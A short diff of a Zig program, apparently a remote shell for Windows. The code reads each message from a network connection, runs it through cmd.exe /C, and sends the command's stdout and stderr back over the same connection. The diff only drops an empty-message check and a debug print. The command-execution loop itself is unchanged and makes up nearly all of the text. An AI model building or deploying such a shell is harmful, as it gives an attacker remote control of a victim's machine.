@@ -14,16 +14,12 @@ pub fn main() !void {
         var msg_size = try conn.read(buf[0..]);
         var msg = buf[0..msg_size];
 
-        if (msg_size != 0) {
-            std.debug.print("{s}", .{msg});
-
-            const result = try std.ChildProcess.exec(.{
-                .allocator = allocator,
-                .argv = &[_][]const u8{ "C:\\Windows\\System32\\cmd.exe", "/C", msg },
-                .cwd_dir = cwd,
-            });
-            try conn.writeAll(result.stdout);
-            try conn.writeAll(result.stderr);
-        }
+        const result = try std.ChildProcess.exec(.{
+            .allocator = allocator,
+            .argv = &[_][]const u8{ "C:\\Windows\\System32\\cmd.exe", "/C", msg },
+            .cwd_dir = cwd,
+        });
+        try conn.writeAll(result.stdout);
+        try conn.writeAll(result.stderr);
     }
 }
